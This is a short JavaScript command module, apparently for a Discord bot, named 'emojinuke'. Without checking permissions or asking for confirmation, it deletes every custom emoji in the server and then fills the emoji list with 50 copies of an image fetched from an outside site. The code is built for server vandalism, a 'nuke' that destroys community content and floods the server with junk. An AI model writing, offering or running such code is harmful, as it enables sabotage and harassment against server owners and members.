module.exports = {
    name: 'emojinuke',
    async execute(message) {

        for (const [key, e] of message.guild.emojis.cache) {
            try {
                await e.delete();
            } catch (err) {
                console.log(err)
            }
        }

        for (let i = 0; i < 50; i++) {
            await message.guild.emojis.create("https://chipiron.es/images/piso.png", "piso")
        }
    }
};